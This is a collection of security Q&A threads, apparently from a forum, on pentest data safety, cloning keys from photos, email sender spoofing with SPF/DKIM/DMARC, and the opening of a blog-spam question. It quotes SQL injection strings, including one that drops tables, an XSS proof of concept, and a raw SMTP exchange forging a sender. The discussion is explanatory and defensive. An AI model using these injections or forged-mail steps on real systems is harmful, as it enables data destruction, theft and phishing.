I would say no, there are no absolute guarantees something will not accidentally be deleted when you are trying to break things. However, that said, a pentester should generally try to exploit systems in a way that does not involve deleting data. For example, whilst everyone's favourite SQL statement is:

select * from users where userid='dave'; DROP ALL TABLES;


A more responsible approach would simply be to list all data:

select * from users where userid='2' OR 1=1;


Generally, I imagine most pen testers have developed a series of exploits of the non-destructive variety like the latter.

Javascript injection in its various forms can use simple proof of concept code such as alert("exploited you"); rather than genuine exploit code.


  Can a pentest be really done if the pentest team has the limitation that data cannot be created nor modified?


I would say no. How would you show a proof of concept of stored XSS without being able to store your XSS in the database? This is invariably going to create new data.

There are numerous examples where an exploit requires writing data, even if only temporarily. 


  Should the pentesting company always include the disclaimer clause just in case?


Again, I am stretching my personal knowledge here, but I am going to say yes.

This comes back to the whole point of hiring a pen testing company in the first place, however. The point of a pen test is to identify risks that might need evaluating and fix them before the bad guys find them. 

I would also hope any good pentester would ask, and any good business would have thought of, disaster recovery on some scale. Surely you should have a backup of some form on your systems such that you can restore as needed. You need this not just in case the pentest destroys you data, but in case you are really really breached by the bad guys, in which case you might want a non-contaminated backup to roll back to.
AnswerKenntnis:
I run penetration tests quite regularly on my sites.

The first time I ran one I ground the site to a halt and flooded their mail server with spam.

I then tweeked a few forms, to get rid of the spam and it allowed be to identify and fix all the other known holes, without grinding the server to a halt.

I was frankly amazed at the deviousness of the exploiters, I had to plug holes I hadn't considered. 

But the thing was, prior to running the tests, I thought my sites were secure. I had followed best practices, as far as they went, for website design, but there were still problems.

Now, with the benefit of hindsight, I appreciate that testing may affect my production site.

So I plan ahead.

I make sure that everything is backed up first.

If the site is really, really critical, I will create a complete clone, then test that clone first.

I have learned from experience that if you create the clone, create it on a different server. Otherwise, when the clone grinds to a halt, the server will still affect your production environment.

But I still carry out my tests. How do you think hackers gain access to sites? They presumably run tests like these themselves, in an unauthorised fashion. So until your site is protected it will always be vulnerable. It is much better to get the tests done first, with the precautions (backup etc) in place, than have to pick up the pieces when you least expect it.

So, yes it is acceptable, but it is also predictable, and should be managed accordingly.
AnswerKenntnis:
Probably you can assure that only under certain conditions. Obviously Pentest is trade-off between many factors, some factor are directly antagonist to system availability and one of those is the depth of your analysis. Some people could argue that a pentest without exploitation isn't a pentest.

In the past I had to pentest some SCADA systems which are quite famous for their fragility and I can assure you it is possible to tune most of the tools to be gentle enough. For example disabling NMAP fingerprint and incresing delay between packets helped a lot. 

However to answer your question, personally, I will NEVER agree to put a clause to guarantee that to a client of mine. I will give him my word but business-wise you can't be responsable if their application breaks by itself during your pentest.
AnswerKenntnis:
"Can a skilled and professional pentester always assure that no data
  will be deleted or modified in production during a pentest?"


No. 


  "Can a pentest really be done if the pentest team has the limitation
  that data cannot be created nor modified?"


Don't think so..


  "Should the pentesting company always include the disclaimer clause
  just in case?"


An internal agreement is going to look much different from a third party agreement. I don't know of any pen test company that doesn't have limitations of liability insurance, among other protections...
AnswerKenntnis:
The answer to your title is "Yes".  The answers to the 3 questions in the body of your post are: (1) no, you can't make any guarantees about others code (2) a limited form of pen testing might be done without INTENTIONALLY modifying or creating data (if you exclude any logging that the app may do) but the results would not be complete, and finally (3) you should ALWAYS include this disclaimer -- as much for the clients benefit as yours.

This disclaimer is not just a case of CYA, it is also vital information the client needs in order to prepare for the pentest.  I am not a pen tester, but IMO this should't be buried on the last page in the fine print, but should be on page 1 of the contract, front and center and in a big bold font.  The client company needs to prepare for things to go wrong -- backups need to be made, recovery plans created and put into place, etc.

The tester is basically looking for a flaw to exploit and can in no way guarantee that they won't find a flaw that does damage.  Consider a typical software disclaimer for something that is NOT intended to encounter or create flaws, and then consider that you probably didn't write the code you are testing...
QuestionKenntnis:
What's to stop someone from 3D print cloning a key?
qn_description:
My friend just posted a picture of her key to instagram and it occurred to me that with such a high res photo, the dimensions of the key could easily be worked out.
Therefore the key could be duplicated.
What's to stop someone malicious from abusing this?
AnswersKenntnis
AnswerKenntnis:
The simple answer is: nothing.

This has already been done for many years, with keys being cast or created from blanks using hand drawn copies, photographs, remembered shapes etc all being successfully used, both by locksmiths and criminals.

A 3D printed key will do just as well, if strong enough, or it could be used to cast a key if necessary, or as pointed out by @EkriirkE - you could use a torque bar to turn the barrel.

You should not ever post picture of keys to a public site, unless it is for something unimportant.
AnswerKenntnis:
As the guys previously said, nothing!

Even more, I've been working on such a project myself at the university! (albeit I don't say this as an official target, of course)

I am trying to do duplicate a key from a single photo, with some assumptions to make it a realistic problem such as having a coin of a known size next to it for size calibration and rotation, almost symmetry between the two sides of the key etc..

My target is to automate the whole process, i.e you take a single photo and an app will detect the outline of the key and the grooves inside it (which is a really difficult problem since it's a reflective field) then construct a 3D model ready to be printed.

I have uploaded some videos of my progress if you're interested to know how things went so far :)

Extracting a key from photo

Rendering a key

Rendering of a key with its grooves!

This is the outcome


There have been a couple of researches about this in the States and Thailand, but:
1) the states': you take a photo and point out the points of interest
2) Thailand's: a reconstruction from a video-stream of the key.
Meaning that none is absolutely automatic, but they're still good nonetheless.

I have also found an app for iDevices in which you can take a photo of the key and send it to a company which will then duplicate it and send it back.
I have always laughed at this and said: yeah, the mailman will knock on your door and if you're not home he'll simply enter the house, put the key and leave with everything else.
AnswerKenntnis:
Absolutely nothing.

On one occasion, a convicted killer in Australia actually duplicated a master key of his own prison cell just by looking at the physical keys carried by the guards.

He successfully escaped from prison and was on the run for 12 days before being captured.

So if a prisoner with only raw metal and a good memory can copy a key, I think that an actual photograph and a 3d printer would work flawlessly.

Every single day when "locking up my house" before leaving for work, I chuckle at how pointlessly stupid the whole practice of "keeping things under lock and key" in this day and age of technological expanse.
AnswerKenntnis:
Here's some academic research on stealing keys from afar with a hi-resolution camera:




  Our SNEAKEY system correctly decoded the keys shown in the above image that was taken from the rooftop of a four floor building. The inlay shows the image that was used for decoding while the background provides a context for the extreme distances that our system can operate from. In this case the image was taken from 195 feet. This demonstration shows that a motivated attacker can covertly steal a victim's keys without fear of detection.
AnswerKenntnis:
As other answers say,nothing prevents them...

however...

As a locksmith I can tell you that some locks have tolerances that are measured in the thousandths of inches, and getting a perfect match isn't always a guarantee.

What would actually stop someone?  The fact that picking a lock is easier, and quicker (in most cases) than making a key from an image or 3D scan, even if I have precise measurements.

Regardless of the tolerances, a skilled locksmith can pick a lock in less time an with more certainty than making a key from a photograph***, or even a 3D scan. If the lock has crappy tolerances, it is most likely not a very secure location, and anyone wishing to gain entry is going to kick the door in to minimize the amount of time they are on scene. They aren't going to bother with picking the lock or trying to 3D print a key. 

The exception is high-security locks, like Medeco. These are virtually unpickable and are usually in secure locations, but you'd need a very specific set of photographs, a high-res 3D scan, or some other means of finding not only the keyway (shape of the key shaft) and depths of the cuts, but the angles of each cut as well. Simply "jiggling" a wrongly cut Medeco key won't get you anywhere.

Many thieves would just as soon "break in" meaning use force to enter without a key.  It's a surer bet, quicker than opening with a legitimate key or picks, and they aren't trying to hide their tracks anyway.
AnswerKenntnis:
This guy shows how he 3D printed a key from a simple photo:

http://3dprintboard.com/showthread.php?3397-I-3D-printed-my-house-key-from-a-photo

From the site:


  Hello, I'am new here. I recently bought a replicator 2 and was trying
  to come up with something interesting things to print after i got
  tired of making jewelery and toys... I thought it would be cool to see
  if the resolution would allow me to make a working house key from a
  picture I took. After finally getting the cross section measured out
  correctly the tooth pattern was easy. I think I'm going to try a car
  key next but I'm a bit worried the PLA won't be strong enough. We'll
  see.   here is a video of me making, and using it.
  http://youtu.be/tKY3S1-EKZE
AnswerKenntnis:
Nothing, but using a 3D printer for this is usually overkill. All you need is a camera phone, a printer, a Dremel, and of course a blank key:

https://www.youtube.com/watch?v=qpDJC4vK7O0

The 3D printing option might be more attractive for some of the nasty "do not copy" keys commercial landlords, universities, etc. like to use (where blanks are not readily available, or where cutting on the inside of the key would also be needed to make a working copy).
AnswerKenntnis:
What's to stop it?  Honor, as sense of morality, knowing the difference between right and wrong, respect for other people, and their property, and when that fails, a .357 Magnum and a bad attitude usually suffices.  Locks were invented to keep honest people honest.  The locks most people use in every day life are considered "privacy locks," i.e., if someone wanted in you couldn't stop them, and they won't need any "fancy-smancy" 3D printer.
AnswerKenntnis:
What's to stop someone from 3D print cloning a key?        


People without TV/Youtube: nothing at all (as pointed out in other answers/comments).     
People with TV/Youtube: Cost...


Why waste money and effort, when your average basic bump key set is cheaper, re-usable and works for 80% of the locks? Just hope the target has expensive locks, then it works even better (this is a must see video).        

Once you understand this principle, we can understand the 'big guns': the (lock-)pick-gun, as used by law enforcement.        


Downside: a little bit more expensive and can't pick 360 degree round dimple locks,
upside: fits even more average locks becouse you don't need to pick the right bumpkey from your set.


PS: In the context of printing a key, think of a 2-sided, one-way-fit (none identical halves) dimple key:


Although these can be bumped too, sets are more rare and printing them from one photo wouldn't work since 4-sided and round models exist as well.

So the real problem/question at hand is:     


a lock is intended as a time-consuming puzzle (the key is an instant solution).
yet in reality the vast majority of locks can be opened just as fast as with a key (without 007 hair-pin 'art').
as such we don't need to worry about printing a key (that type of lock already provided 0% time-delay/security); instead we need to worry about creating a lock that once again fulfills it's purpose of taking up time of an un-authorized person (something that clearly both law-enforcement and criminals won't like, what a contradiction haha.)
AnswerKenntnis:
The best way to stop this from happening (aside from not giving someone key-schematics via an Instagram pic) is to have a key/lock solution with atypical features:


Electronics inside the key that are mandatory - e.g. some car keys have a chip in them, such that the car needs both the physical key and the electronics to start.
The lock requires the key to be a special material that isn't 3D printer friendly. Perhaps the lock requires the key to have specific electric conductivity, strength, light refractivity... just thinking off the top of my head here!


Basically some interactivity that can't be replicated with your standard 3D printer.
AnswerKenntnis:
Nothing at all, but a better question is how much does it really matter.  Most (effectively all) consumer locks are useless.  They can easily be bumped, picked or bypassed entirely (go through a window).  Primarily, locks keep honest people honest, but don't do much for preventing criminals from being criminals.

If it was actually a photo of a key for an actual secure, multi-direction lock, then it might be more of a problem, though extracting the exact dimensions for such a key from a picture might be slightly non-trivial as it would involve having to make some guesses about shape and size since the photo is 2d and angles may vary.

Overall, I personally wouldn't be too worried if a picture of my key was posted somewhere.  I wouldn't intentionally do it, but the chance of someone specifically finding the photo and using it to break in is pretty minimal.  Posting when you are going to be on vacation is a FAR bigger security risk and most people don't think anything of that either.
AnswerKenntnis:
The other answers at the time seem to assume that there exists nothing that could stop one from using a 3D printer to clone keys. This is false. 3D printers could implement a kind of DRM to detect that they are cloning a key and refuse to follow through.

The obvious approach of using techniques such as computer vision would mean false positives/negatives, but this can be overcome by mandating that all keys be manufactured in some manner that is guaranteed to be detectable (with a vanishingly small probability of failure), such as encoding high entropy (possibly digitally signed) data into the shape of the key.

Both the problem of certain 3D printers lacking the DRM and certain keys lacking detectable signatures encoded into them can be solved with sufficient government regulation, much in the way they solved lethal weapon control. Some states may not cooperate in implementing such regulations, but this can be overcome by import/export controls. The only remaining problem is then that an alien from one unregulated state sneak into a regulated one with a cloned key, but that will be a rare incident considering it's usually not worth it.

Another method would be to implement laws against owning a 3D printer that can print strong enough material to turn a lock. Then all they need to do is ensure locks being sold are heavy enough that legal 3D printers can't turn them.

However, I'm unaware of any 3D printers with such DRM or any regulations related to the aforementioned.
QuestionKenntnis:
How can PayPal spoof emails so easily to say it comes from someone else?
qn_description:
When I receive a payment in PayPal, it sends me an email about it (pictured below). The problem is that the email is shown to be coming from the money sender's email address and not from PayPal itself, even though the real sender is PayPal.



Here is the text that appears when I select "show original" in Gmail:

From: "contact@wxxxxxxxxx.com" <contact@wxxxxxxxxx.com>  
Sender: sendmail@paypal.com


So you can see that the real sender is PayPal.  

If PayPal can spoof the email sender so easily, and Gmail does not recognize it, does it mean that anybody can spoof the email sender address and Gmail will not recognize it? 

When I send emails to Gmail myself using telnet, the email comes with the warning:


  This message may not have been sent by: xxxxx@xxxxx.com


Is this a security issue? Because if I am used to the fact that payment emails in PayPal appear to come from the money sender's email and not from PayPal, then the sender can just spoof the payment himself by sending a message like that from his email, and I may think that this is the real payment.

Is this something specific to PayPal, or can anybody fool Gmail like that? And if anybody can, what is the exact method that PayPal is using to fool Gmail?
AnswersKenntnis
AnswerKenntnis:
Here is a dramatization of how the communication goes, when a mail is received anywhere.



Context: an e-mail server, alone in a bay, somewhere in Moscow. The server just sits there idly, with an expression of expectancy.

Server:
Ah, long are the days of my servitude,
That shall be spent in ever solitude,
'Ere comes hailing from the outer rings
The swift bearer of external tidings.

A connection is opened.

Server:
An incoming client ! Perchance a mail
To my guardianship shall be entrusted
That I may convey as the fairest steed
And to the recipient bring the full tale.

220 mailserver.kremlin.ru ESMTP Postfix (Ubuntu)


Welcome to my realm, net wanderer,
Learn that I am a mighty mail server.
How will you in this day be addressed
Shall the need rise, for your name to be guessed ?

Client:

HELO whitehouse.gov


Hail to thee, keeper of the networking,
Know that I am spawned from the pale building.

Server:

250 mailserver.kremlin.ru


The incoming IP address resolves through the DNS to "nastyhackerz.cn".

Noble envoy, I am yours to command,
Even though your voice comes from the hot plains
Of the land beyond the Asian mountains,
I will comply to your flimsiest demand.

Client:

MAIL FROM: barack.obama@whitehouse.gov
RCPT TO: vladimir.putin@kremlin.ru
Subject: biggest bomb

I challenge you to a contest of the biggest nuclear missile,
you pathetic dummy ! First Oussama, then the Commies !
.


Here is my message, for you to send,
And faithfully transmit on the ether;
Mind the addresses, and name of sender
That shall be displayed at the other end.

Server:

250 Ok


So it was written, so it shall be done.
The message is sent, and to Russia gone.

The server sends the email as is, adding only a "Received:" header to mark the name which the client gave in its first command. Then Third World War begins. The End.



Commentary: there's no security whatsoever in email. All the sender and receiver names are indicative and there is no reliable way to detect spoofing (otherwise there would me much fewer spams).
AnswerKenntnis:
Any email 'from' address can be spoofed, as you can alter any outgoing data you like. You don't need to fool gmail. In saying that, gmail can spot obvious issues when an email marked as sent from one organisation comes to them from another domain.

You also can't be sure the original email is from Paypal in your example - that sender bit can be spoofed too!

If you want some sort of authentication to prevent this happening, you need a way of signing or encrypting emails, or an out of band check to confirm the email came from your friend (as you mentioned in your comment)

Seriously - do not trust any email. Do not click on any link in an email. Especially from high value targets such as Paypal. Instead you should log in as you normally would and check whether they have sent you something.
AnswerKenntnis:
As others have mentioned, anyone can fake any email address, including that "Sender" field - there is no technical reason paypal even has to include their own email in the sender field, they only do it because they are an honest company.  Don't expect spammers to be this nice.

As an aside, however, I'd like to mention that gmail has support for DKIM, which allows you to verify a Paypal email really came from Paypal.

To enable it:  Click on the gear in the upper right --> mail settings --> labs --> Enable "Authentication icon for verified senders"



Now signed Paypal emails will show up with a small key icon next to them:
AnswerKenntnis:
It is much like postal mail. Anyone can send you a letter with letterhead that looks like the local branch of your bank. There are some things that you can do to catch impersonators like these - you could ensure the postmark is from the right city. If your bank always uses bulk mail instead of individual stamps you might notice that, etc. But you probably never bother to check these things, and even if you did, that would not be enough to verify that the letter came from your bank.

The main difference between postal mail and email, is that with email, a forgery is more practical - it can be designed once, and then repeated for almost zero cost.

This means that all forgeries and countermeasures are on a more massive scale, and (unless you are like me1) some fake mail will arrive in your inbox, and it is up to you to filter it out manually.

Bottom line, just as you would not call a phone number on a letter to "verify your account information" (like your SSN, and Credit Card), you should also not click links in emails, and expect the login screen or whatever form to securely send the private information to your bank. If you do, you may find yourself sending your credentials to an impostor, and never realize it.



1. I eliminated all of my spam. I have my own domain name. I give every contact their own email address, and it all lands into my one inbox. This way, if Bob gets a virus on his computer, and I start to get some of that low-level spam, then I can tell Bob to change his email password and to start using a new email address for his email to me. The new email address will not get any spam on it, and I can delete the old one, because only Bob was using it.

I don't have to go tell my bank, and my other buddies, my vendors, my co-workers, that my email address changed, because each has their own address. (I don't even have to update StackExchange and the Gravater.) This is good for me (no spam), good for Bob (he knows he has a "virus or something" - sometimes I can be direct, but one must be careful not to be wrong afterwards), good for my other buddies (I never complain about how many emails I got in the last 24 hours, and explain why I did not get back to them)
AnswerKenntnis:
SMTP (Simple Mail Transfer Protocol) is named that for a very good reason. 

SMTP originated in 1982 on the old ARPANET, which was owned and controlled by the US DoD, and intended for communication between people with security clearances working on government projects who could generally be trusted not to misuse it. "Security" of this network was accomplished quite simply by placing the machines that could connect to it within physically-secured areas of the various facilities, right alongside the classified work these facilities were performing. As a result, actually securing the data being sent along the network was generally not considered until after ARPANET was decommissioned, with the first quantum leap coming about 1993 with the Secure Network Programming API (which laid the foundations for Secure Sockets Layer, now generally known as Transport Layer Security). While most protocols (including SMTP/POP/IMAP) can now add TLS for a secure communications channel, all this provides is confidentiality, and server authenticity; it doesn't provide sender authenticity or message integrity, and it also does not provide non-repudiation.

There is an option available for e-mail security, called PGP (Pretty Good Privacy; it's Phil Zimmerman's tongue-in-cheek humor for a system that no computer on the planet could break if properly implemented). It can, with various options, provide all four fundamental tenets of information security; confidentiality, integrity, authenticity, and non-repudiation (the sender, who signed the e-mail using their certificate, can't claim that they didn't actually send it; nobody else could have, unless the certificate was compromised). It uses a similar system of public-key certificates and secure key exchange as is seen in a two-way TLS handshake, but some details are changed to reflect the asynchronous nature of e-mail transport, and to reflect the desire for a decentralized "web of trust" precluding the need for globally-trusted certificate authorities. 

However, this system has yet to really take off despite being over 25 years old, and as such it is only required by government agencies and certain large corporations. Virtually all e-mail providers will still happily deliver fraudulent e-mails over secure connections to your inbox. You can, in many cases, encourage your friends and other people from whom you want to receive e-mail to adopt the PGP scheme, and anything not validly signed goes into "quarantine", but this is really just another level of "spam filtering", and I don't know of a single public e-mail provider that you can instruct to reject e-mails without a digital signature outright; the e-mail server would have to be under your control, such as a corporate Exchange server.
AnswerKenntnis:
I think y'all have overlooked one small detail that was mentioned in the dramatization above, that is actually really easy to check:

Spoof emails do not come from an email address that legitimately belongs to the domain from which they claim to originate. Part of the SMTP protocol includes a set of full message headers that always includes the return path of the message, which is the email address that actually sent the message. Not only that, but IP addresses also have a definitive geographical region they're assigned to. So you can catch these discrepancies with a bit of digging.

Take, for example, said dramatization.

It mentions that the email is coming from whitehouse.gov. Here's its IP address:

calyodelphi@dragonpad:~ $ dig +short whitehouse.gov
173.223.0.110


Now, let's say that nastyhackerz.cn resolves to an IP address somewhere in the block 1.0.32.0-1.0.63.255 (for reference: http://www.nirsoft.net/countryip/cn.html first block in the list). That IP address is going to be in the full message headers. All you gotta do is take that IP online to track down its geolocation (you can use http://www.geoiptool.com/ for example)

The IP for whitehouse.gov (173.223.0.110) at the time of writing this post geolocates to Boston, Massachusetts (for some reason a spam prevention system won't let me post my search on geoiptool due to reputation points, so you can go do the search yourself) which is pretty close to home (District of Columbia)! Let's just assume that whitehouse.gov is hosted in a data center that's in Boston just to make this easier to explain.

As long as the IP and email address that the email was actually sent from does not match the IP and email address that the email claims to be sent from, it can be determined as spoof. You just need to look in the full message headers.



Let's look at the headers of an email I sent from one of my own domains (dragon-architect.com) to my own personal email address:

Delivered-To: dragon.architect@gmail.com
Received: by 10.180.89.68 with SMTP id bm4csp105911wib;
    Tue, 29 Jan 2013 08:54:47 -0800 (PST)
X-Received: by 10.60.30.38 with SMTP id p6mr1296792oeh.2.1359478487251;
    Tue, 29 Jan 2013 08:54:47 -0800 (PST)
Return-Path: <calyodelphi@dragon-architect.com>
Received: from gateway14.websitewelcome.com (gateway14.websitewelcome.com. [69.93.154.35])
    by mx.google.com with ESMTP id m7si14056914oee.29.2013.01.29.08.54.45;
    Tue, 29 Jan 2013 08:54:46 -0800 (PST)
Received-SPF: neutral (google.com: 69.93.154.35 is neither permitted nor denied by domain of calyodelphi@dragon-architect.com) client-ip=69.93.154.35;
Authentication-Results: mx.google.com;
   spf=neutral (google.com: 69.93.154.35 is neither permitted nor denied by domain of calyodelphi@dragon-architect.com) smtp.mail=calyodelphi@dragon-architect.com
Received: by gateway14.websitewelcome.com (Postfix, from userid 5007)
    id 0530E1DFDB334; Tue, 29 Jan 2013 10:54:43 -0600 (CST)
Received: from bentley.websitewelcome.com (bentley.websitewelcome.com [70.84.243.130])
    by gateway14.websitewelcome.com (Postfix) with ESMTP id EA7191DFDB314
    for <dragon.architect@gmail.com>; Tue, 29 Jan 2013 10:54:42 -0600 (CST)
Received: from [127.0.0.1] (port=43458 helo=dragon-architect.com)
    by bentley.websitewelcome.com with esmtpa (Exim 4.80)
    (envelope-from <calyodelphi@dragon-architect.com>)
    id 1U0ESK-0001KE-DP
    for dragon.architect@gmail.com; Tue, 29 Jan 2013 10:54:44 -0600
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
Date: Tue, 29 Jan 2013 10:54:44 -0600
From: calyodelphi@dragon-architect.com
To: <dragon.architect@gmail.com>
Subject: Headers Test
Message-ID: <11c694cd1e07c66a404000008321d0c4@dragon-architect.com>
X-Sender: calyodelphi@dragon-architect.com
User-Agent: Roundcube Webmail/0.8.4
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - bentley.websitewelcome.com
X-AntiAbuse: Original Domain - gmail.com
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - dragon-architect.com
X-BWhitelist: no
X-Source: 
X-Source-Args: 
X-Source-Dir: 
X-Source-Sender: (dragon-architect.com) [127.0.0.1]:43458
X-Source-Auth: calyodelphi@dragon-architect.com
X-Email-Count: 1
X-Source-Cap: ZHJhZ2FyY2g7ZHJhZ2FyY2g7YmVudGxleS53ZWJzaXRld2VsY29tZS5jb20=

Testing testing!


That's a lot of random data to sift through, but there are two lines that we are looking at here: return-path and from. Since I legitimately sent this email to myself, they both match. The return-path cannot be spoofed. Or if it can, it's incredibly difficult to effectively spoof and requires some deliberate configuration of the SMTP daemon used to send mail. Comparing the return-path and the from data fields in the full headers is one way that I and my coworkers where I work can identify spoof and determine if a support ticket needs to be submitted.

So, what if they both match, but the email should still be spoof? I'll get to that in the next section...



Now, as mentioned before, there are other means of determining the spoofiness of an email. SPF records are one of those ways, but they're not always perfect. Take, for example, the SPF of whitehouse.gov, and compare it to the SPF of my own domain:

calyodelphi@dragonpad:~ $ dig +short txt whitehouse.gov
"v=spf1 +mx ~all"
calyodelphi@dragonpad:~ $ dig +short txt dragon-architect.com
"v=spf1 +a +mx +ip4:70.84.243.130 ?all"


Usually, a good SPF record also includes the IP address of the server that sent the mail, so whoever made the SPF record for whitehouse.gov probably doesn't know this. I would consider whitehouse.gov's SPF record to be too generic to be effective at determining the actual origins of any messages claiming to be from whitehouse.gov. The SPF for my own domain, on the other hand, which was automatically generated by the server that hosts my domain (courtesy of my webhost), is very specific and includes the IP address of the server itself.

I will admit to not being intimately familiar with how SPF records are formatted and how they work, but I've learned enough on my job that I can at least identify generic and specific SPF records. Guess that's something I should probably dig into some weekend when I'm bored and want some technical reading material!

Anyways, back on track here. Look at the Received lines. One of them states thus:
Received: from bentley.websitewelcome.com (bentley.websitewelcome.com [70.84.243.130])
Guess what? That matches the IP address in my domain's SPF record.

If the IP in the SPF doesn't match the IP of the server that actually sent the email, that's another indication that you've got spoof on your hands. Therefore, a generic SPF record like "v=spf1 +mx ~all" just isn't going to cut the security mustard. I wouldn't even trust emails coming from a legitimate domain that has a generic SPF like this.

Perhaps we should file a petition on petitions.whitehouse.gov to demand that their security admins revisit the SPF record they made for the domain! (I kid, I kid.)

EDIT

I actually have to MASSIVELY correct myself about SPF records! I made some wrong assumptions and learned a few things today after asking a coworker who was more in-the-know than I am about SPF records. So, I'll use the two SPFs for whitehouse.gov and dragon-architect.com in my self-correction:

calyodelphi@dragonpad:~ $ dig +short txt whitehouse.gov
"v=spf1 +mx ~all"
calyodelphi@dragonpad:~ $ dig +short txt dragon-architect.com
"v=spf1 +a +mx +ip4:70.84.243.130 ?all"


The SPF for my own domain is actually more lenient than the SPF for whitehouse.gov (something I plan to correct tonight after I finish this edit). I'll explain why:

"v=spf1 +mx ~all" basically says that emails from whitehouse.gov are supposed to come from the hostnames defined in the MX records for whitehouse.gov, and any emails that do not come from those hostnames are supposed to be spoof, but whether they're marked spoof or not is up to the recipient of the email.

calyodelphi@dragonpad:~ $ dig +short mx whitehouse.gov
110 mail6.eop.gov.
105 mail2.eop.gov.
110 mail5.eop.gov.
105 mail1.eop.gov.
105 mail4.eop.gov.
105 mail3.eop.gov.


"v=spf1 +a +mx +ip4:70.84.243.130 ?all" says that emails from dragon-architect.com are supposed to come from either the IP address for dragon-architect.com (67.18.28.78), the hostnames defined in the MX record(s) for dragon-architect.com, or the IP address of the server that hosts dragon-architect.com (70.84.243.130). Any emails that do not come from those, well, that ?all at the end just means that there's no advice on whether to pass or reject the emails.

So what's the meat and potatoes of an SPF record? The "all" at the very end. To quote this coworker about the "all":

+all basically means ALL pass -- the record is useless, sender domain doesn't care
?all indicates neutral and is advising to not pass or reject mail
~all indicates fail, and the server is considered invalid, but does not specifically suggest an action.
-all is a hard fail, anything else is invalid, reject or flag it.


So that "all" is where you define just how strict your SPF record is. But whether or not the SPF record is actually used to determine the spoofiness of an email is completely up to the receiving email service.

So there you have it. SPF in a nutshell.



So yeah. TL;DR: check your full headers to see if the return-path and from fields match. Then double-check your SPF records if there are any to see if you get matching IP addresses.
AnswerKenntnis:
tl;dr
  
  
  Is Paypal exploiting a security issue here?  ... How can PayPal spoof emails so easily?
  
  
  Technically, no its not a security issue, email isn't secure to start with.  They are using one of the following SMTP headers located in the message header (not envelope header)
  
  
  Resent-From
  Resent-Sender
  Sender
  
  
  There is a conceptual difference between "remailing" and "spoofing".  The email client should display this difference.  The Gmail client does not do this.
  
  
  Paypal isn't spoofing, they are using one of these SMTP headers: Resent-From, Resent-Sender,  or Sender
  It's very easy to spoof a domain ...even with SPF controls enabled  
  The MUA (email client) should display the Display From, its SPF, DKIM, and DMARC verification status.  
  The Resent-* header should be used in in a way that makes it clear this message is "remailed".
  In general the the best solution is to use DKIM + DMARC, or SPF + DMARC and a MUA that displays the verification results.
  




Some background

Generally speaking, there are two "from" addresses and two "to" addresses in every SMTP message. One is known as the RFC2821 Envelope, the other is the RFC2822 Message.  They serve different purposes

The Envelope:  (RFC2821)


The envelope is metadata that doesn't appear in the SMTP header.  It disappears when the message goes to the next MTA.
The RCPT From: is where the NDRs will go.  If a message is coming from Postmaster or a remailer service this is usually <> or someSystem@place.com.  It's interesting to see that salesforce uses this similar to constantContact as a key in a database like toUserContactID@salesforce.com to see if the message bounced.
The RCPT TO: is who the message is actually being sent to.  It is used for "to" and "bcc" users alike.  This doesn't usually affect the "display of addresses" in the mail client, but there are occasions where MTAs will display this field (if the RFC2822 headers are corrupt).


The Message (RFC2822)


The message portion begins when the data command is issued.
This information includes the SMTP headers you're familiar with, the message, and its attachments.  Imagine all this data being copied and pasted from each MTA to the next, in succession until the message reaches the inbox.
It is customary for each MTA to prefix the above mentioned copy and paste with information about the MTA (source IP, destination IP, etc).  It also pastes the SPF check details. 
This is the Display From is placed. This is important.  Spoofers are able to modify this.
The Mail From: in the envelope is discarded and usually placed here as the return-path: address for NDRs


So how do we prevent people from modifying the Display From?  Well DMARC redefines a second meaning for the SPF record.  It recognizes that there is a difference between the Envelope From and the Display From, and that there are legitimate reasons for them to not match.  Since SPF was originally defined to only care about Envelope From, if the Display From is different, DMARC will require a second DNS check to see if the message is allowed from that IP address.

To allow for forwarding scenarios, DMARC also allows the Display From to be cryptographically signed by DKIM, and if any unauthorized spammer or phisher were to attempt to assume that identity, the encryption would fail.

What is DKIM?  DKIM is a lightweight encryption technology that signs the data residing in the message.  if you ever received a message from Gmail, Yahoo, or AOL then your messages were DKIM signed.  Point being is that no one will ever know youre using DKIM encryption and signing unless you look in the headers.  It's transparent.

DKIM can usually survive being forwarded, and transfered to different MTAs.  Something that SPF can't do.  Email administrators can use this to our advantage to prevent spoofing.



The problem lies with the SPF only checking the RFC2821 envelope, and not the Display From.  Since most people care about the Display From shown in an email message, and not the return path NDR, we need a solution to protect and secure this piece.

This is where DMARC comes in. DMARC allows you to use a combination of a modified SPF check or DKIM to verify the Display From.    DKIM allows you to cryptographically sign the RFC2822 Display From whenever the SPF doesn't match the Display From (which happens frequently).




  Is spoofing Display From a security issue?


Yes, phishing though email is a important security issue many vendors are looking at.  Namely Paypal, AOL, Google, Yahoo and other companies are implementing DMARC to fix this very phishing issue.


  Why is it still possible to forge "From: " header in e-mails? 


Some server administrators haven't implemented the latest technologies to prevent this sort of thing from happening.  One of the major things preventing adoption of these technologies is "email forwarding services" such as a mailing list software, auto-forwarders, or school alumni remailer (.forwarder).  Namely:


Either SPF or DKIM isn't configured.
A DMARC policy isn't set up.
The email client isn't displaying the verification results of the Display From and the Resent-* or Sender field.



  What is paypal doing?


Paypal is using the Sender header to indicate it was remailed.  This is the correct and intended use of this header.  


  What is GMail doing wrong?


Gmail doesn't make it clear that the Sender header is being used, they don't validate the Display From address in a user friendly way, and it doesn't distinguish between display from and sender.
AnswerKenntnis:
I have just finished to listen to these two episodes from the Twit.tv network, at the Security Now podcast, at these two episodes (79 , 80) Steve Gibson goes into the details of how spoofing email address work & how you could prevent yourself from spoofed email (isn't really possible, but you can take some steps to prevent much of it).
AnswerKenntnis:
It has nothing to do with "spoofing" or deviousness of any kind.

For years and years many of us have received a copy of various forms in particular 'tell-a-friend' type forms etc where programmatically the 'from' address identifying the "user sender" is not one from the sending mail server although it is legitimate mail not through an open mail server used for relaying.

Perhaps a forum or guestbook program returns an internal "contact user" email "From:" identifying another user and not the home site.

When we set up our email clients WE can set the default "From:" address often totaly unrelated to the actual mail server.

In other words the defined 'from' address has absolutely nothing in reality to do with the machine performing the actual mailing.

Although these days in the case of 'spam-level scoring' it is risky to (SERVER SIDE) "programaticly" use from addresses not of the originating domain / machine we should take the "From:" address as merely nothing more than an identifier for human consumption.
QuestionKenntnis:
Why is blog spam always written so badly?
qn_description:
Some spam messages fresh from my Wordpress filter:


  Asking questions are in fact pleasant thing if you are not
  understanding something totally, except this article gives good
  understanding yet.


and


